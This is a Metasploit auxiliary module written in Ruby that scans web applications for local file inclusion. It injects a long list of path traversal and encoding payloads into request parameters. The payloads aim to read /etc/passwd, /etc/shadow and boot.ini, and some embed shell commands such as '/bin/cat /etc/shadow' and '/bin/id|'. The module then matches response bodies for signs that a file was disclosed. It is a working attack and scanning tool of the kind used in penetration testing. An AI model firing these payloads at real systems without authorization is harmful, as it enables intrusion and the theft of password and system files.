##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WMAPScanUniqueQuery
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report


	def initialize(info = {})
		super(update_info(info,
			'Name'   		=> 'HTTP LFI basic Scanner',
			'Description'	=> %q{
				This module identifies the existence of basic LFI issues. Still requires alot of work! This module is based on the error based SQL injection module of et. 

			},
			'Author' 		=> [ 'et [at] cyberspace.org',
			 				'm-1-k-3' ],
			'License'		=> BSD_LICENSE,
			'Version'		=> '$Revision$',
			'References'	=>
						[
							['CWE', '98'],
							['CWE', '22']
						]
			))
		register_options(
			[
				OptString.new('METHOD', [ true, "HTTP Method",'GET']),
				OptString.new('PATH', [ true,  "The path/file to test LFI injection", '/default.aspx']),
				OptString.new('QUERY', [ false,  "HTTP URI Query", '']),
				OptString.new('DATA', [ false,  "HTTP Body/Data Query", ''])
			], self.class)

		register_advanced_options(
			[
				OptBool.new('NoDetailMessages', [ false, "Do not display detailed test messages", true ])
			], self.class)

	end

	def run_host(ip)

		qvars = nil

		lfiinj = [
			[ "/boot.ini" ,'basic check'],
			[ "/etc/passwd" ,'basic check'],
			[ "/etc/shadow" ,'basic check'],
			[ "C:/boot.ini" ,'basic check'],
			[ "C:\boot.ini" ,'basic check'],
			[ "../../../../../../../../../../../../etc/hosts%00" ,'advanced check'],
			[ "../../../../../../../../../../../../etc/hosts" ,'advanced check'],
			[ "../../boot.ini" ,'advanced check'],
			[ "../../../../../../../../../../../../etc/passwd%00" ,'advanced check'],
			[ "../../../../../../../../../../../../etc/passwd" ,'advanced check'],
			[ "../../../../../../../../../../../../etc/shadow%00" ,'advanced check'],
			[ "../../../../../../../../../../../../etc/shadow" ,'advanced check'],
			[ "/../../../../../../../../../../etc/passwd^^" ,'advanced check'],
			[ "/../../../../../../../../../../etc/shadow^^" ,'advanced check'],
			[ "/../../../../../../../../../../etc/passwd" ,'advanced check'],
			[ "/../../../../../../../../../../etc/shadow" ,'advanced check'],
			[ "/./././././././././././etc/passwd" ,'advanced check'],
			[ "/./././././././././././etc/shadow" ,'advanced check'],
			[ "\..\..\..\..\..\..\..\..\..\..\etc\passwd" ,'advanced check'],
			[ "\..\..\..\..\..\..\..\..\..\..\etc\shadow" ,'advanced check'],
			[ "..\..\..\..\..\..\..\..\..\..\etc\passwd" ,'advanced check'],
			[ "..\..\..\..\..\..\..\..\..\..\etc\shadow" ,'advanced check'],
			[ "/..\../..\../..\../..\../..\../..\../etc/passwd" ,'advanced check'],
			[ "/..\../..\../..\../..\../..\../..\../etc/shadow" ,'advanced check'],
			[ ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd" ,'advanced check'],
			[ ".\\./.\\./.\\./.\\./.\\./.\\./etc/shadow" ,'advanced check'],
			[ "\..\..\..\..\..\..\..\..\..\..\etc\passwd%00" ,'advanced check'],
			[ "\..\..\..\..\..\..\..\..\..\..\etc\shadow%00" ,'advanced check'],
			[ "..\..\..\..\..\..\..\..\..\..\etc\passwd%00" ,'advanced check'],
			[ "..\..\..\..\..\..\..\..\..\..\etc\shadow%00" ,'advanced check'],
			[ "%0a/bin/cat%20/etc/passwd" ,'advanced check'],
			[ "%0a/bin/cat%20/etc/shadow" ,'advanced check'],
			[ "%00/etc/passwd%00" ,'advanced check'],
			[ "%00/etc/shadow%00" ,'advanced check'],
			[ "%00../../../../../../etc/passwd" ,'advanced check'],
			[ "%00../../../../../../etc/shadow" ,'advanced check'],
			[ "/../../../../../../../../../../../etc/passwd%00.jpg" ,'advanced check'],
			[ "/../../../../../../../../../../../etc/passwd%00.html" ,'advanced check'],
			[ "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd" ,'advanced check'],
			[ "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow" ,'advanced check'],
			[ "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" ,'advanced check'],
			[ "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow" ,'advanced check'],
			[ "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00" ,'advanced check'],
			[ "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00" ,'advanced check'],
			[ "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00" ,'advanced check'],
			[ "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini" ,'advanced check'],
			[ "\\&apos;/bin/cat%20/etc/passwd\\&apos;" ,'advanced check'],
			[ "\\&apos;/bin/cat%20/etc/shadow\\&apos;" ,'advanced check'],
			[ "/../../../../../../../../bin/id|" ,'advanced check'],
			[ "../../../../../../../../../../../../boot.ini%00" ,'advanced check'],
			[ "../../../../../../../../../../../../boot.ini" ,'advanced check'],
			[ "/./././././././././././boot.ini" ,'advanced check'],
			[ "/../../../../../../../../../../../boot.ini%00" ,'advanced check'],
			[ "/../../../../../../../../../../../boot.ini" ,'advanced check'],
			[ "/..\../..\../..\../..\../..\../..\../boot.ini" ,'advanced check'],
			[ "/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini" ,'advanced check'],
			[ "\..\..\..\..\..\..\..\..\..\..\boot.ini" ,'advanced check'],
			[ "..\..\..\..\..\..\..\..\..\..\boot.ini%00" ,'advanced check'],
			[ "..\..\..\..\..\..\..\..\..\..\boot.ini" ,'advanced check'],
			[ "/../../../../../../../../../../../boot.ini%00.html" ,'advanced check'],
			[ "/../../../../../../../../../../../boot.ini%00.jpg" ,'advanced check'],
			[ "/.../.../.../.../.../" ,'advanced check'],
			[ "..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini" ,'advanced check'],
			[ "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini" ,'advanced check'],


		]
		# I think we have to do some work with the error strings -> this is just some basic stuff
		errorstr = [
			["root:",'Linux LFI','root user check'],
			["nobody:",'Linux LFI','nobody user check'],
			["daemon:",'Linux LFI','daemon user check'],
			["\[boot loader\]",'Windows LFI','Windows boot.ini check'],
			["\[operating systems\]",'Windows LFI','Windows boot.ini check'],
			["default=multi",'Windows LFI','Windows boot.ini check']
		]

		#
		# Dealing with empty query/data and making them hashes.
		#

		if  datastore['METHOD'] =='GET'
			if not datastore['QUERY'].empty?
				qvars = queryparse(datastore['QUERY']) #Now its a Hash
			else
				return
			end
		else
			if not datastore['DATA'].empty?
				qvars = queryparse(datastore['DATA']) #Now its a Hash
			else
				return
			end
		end

		#
		# Send normal request to check if error is generated
		# (means the error is caused by other means)
		#
		#

		if datastore['METHOD'] == 'POST'
			reqinfo = {
				'uri'  		=> datastore['PATH'],
				'query' 	=> datastore['QUERY'],
				'data' 		=> datastore['DATA'],
				'method'   	=> datastore['METHOD'],
				'ctype'		=> 'application/x-www-form-urlencoded',
				'encode'	=> false
			}
		else
			reqinfo = {
				'uri'  		=> datastore['PATH'],
				'query' 	=> datastore['QUERY'],
				'method'   	=> datastore['METHOD'],
				'ctype'		=> 'application/x-www-form-urlencoded',
				'encode'	=> false
			}
		end

		begin
			normalres = send_request_raw(reqinfo, 20)

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end

		if !datastore['NoDetailMessages']
			print_status("Normal request sent.")
		end

		found = false
		inje = nil
		dbt = nil
		injt = nil

		if normalres
			errorstr.each do |estr,dbtype,injtype|
				if normalres.body.include? estr
					found = true
					inje = estr
					dbt = dbtype
					injt = injtype
				end
			end

			if found
				print_error("[#{wmap_target_host}] Error string appears in the normal response, unable to test")
				print_error("[#{wmap_target_host}] Error string: '#{inje}'")
				print_error("[#{wmap_target_host}] Vuln: #{dbt}")

				#its a vulnerability
				report_vuln(
					:host	=> ip,
					:proto	=> 'tcp',
					:name	=> self.fullname,
					:port	=> rport,
					:refs	=> self.references
				)
				#but we need more info ... so lets report also a note
				report_note(
					:host	=> ip,
					:proto	=> 'tcp',
					:name	=> self.fullname,
					:sname	=> 'HTTP',
					:port	=> rport,
					:type	=> 'LFI_Vuln',
					:data	=> "#{datastore['PATH']} Location: QUERY Parameter: #{key} Value: #{istr} Error: #{inje} Vuln: #{dbt}",
				)
				return
			end
		else
			print_error("[#{wmap_target_host}] No response")
			return
		end

		#
		# Test URI Query parameters
		#

		found = false

		if qvars
			lfiinj.each do |istr,idesc|

				if found
					break
				end

				qvars.each do |key,value|
					if datastore['METHOD'] == 'POST'
						qvars = queryparse(datastore['DATA']) #Now its a Hash
					else
						qvars = queryparse(datastore['QUERY']) #Now its a Hash
					end
					qvars[key] = qvars[key]+istr

					if !datastore['NoDetailMessages']
						print_status("- Testing query with #{idesc}. Parameter #{key}:")
					end

					fstr = ""
					qvars.each_pair do |var,val|
						fstr += var+"="+val+"&"
					end

					if datastore['METHOD'] == 'POST'
						reqinfo = {
							'uri'  		=> datastore['PATH'],
							'query'		=> datastore['QUERY'],
							'data' 		=> fstr,
							'method'   	=> datastore['METHOD'],
							'ctype'		=> 'application/x-www-form-urlencoded',
							'encode'	=> false
						}
					else
						reqinfo = {
							'uri'  		=> datastore['PATH'],
							'query' 	=> fstr,
							'method'   	=> datastore['METHOD'],
							'ctype'		=> 'application/x-www-form-urlencoded',
							'encode'	=> false
						}
					end

					begin

						testres = send_request_raw(reqinfo, 20)

					rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
					rescue ::Timeout::Error, ::Errno::EPIPE
					end

					if testres
						errorstr.each do |estr,dbtype,injtype|
							if testres.body.include? estr
								found = true
								inje = estr
								dbt = dbtype
								injt = injtype
							end
						end

						if found
							print_status("[#{wmap_target_host}] possible LFI vulnerability found. (#{idesc}) (#{datastore['PATH']})")
							print_status("[#{wmap_target_host}] LFI string: '#{inje}' Test Value: #{qvars[key]}")
							print_status("[#{wmap_target_host}] Vuln query parameter: #{key} / LFI-TYPE: #{dbt}, Test type '#{injt}'")
							
							#its a vulnerability
							report_vuln(
								:host	=> ip,
								:proto	=> 'tcp',
								:name	=> self.fullname,
								:port	=> rport,
								:refs	=> self.references
							)
							
							#but we need more info ... so lets report also a note
							report_note(
								:host	=> ip,
								:proto	=> 'tcp',
								:name	=> self.fullname,
								:sname	=> 'HTTP',
								:port	=> rport,
								:type	=> 'LFI_Vuln',
								:data	=> "#{datastore['PATH']} Location: QUERY Parameter: #{key} Value: #{istr} Error: #{inje} Vuln: #{dbt}",
							)

							return
						end
					else
						print_error("[#{wmap_target_host}] No response")
						return
					end
				end
			end

			if datastore['METHOD'] == 'POST'
				qvars = queryparse(datastore['DATA']) #Now its a Hash
			else
				qvars = queryparse(datastore['QUERY']) #Now its a Hash
			end
		end
	end
end
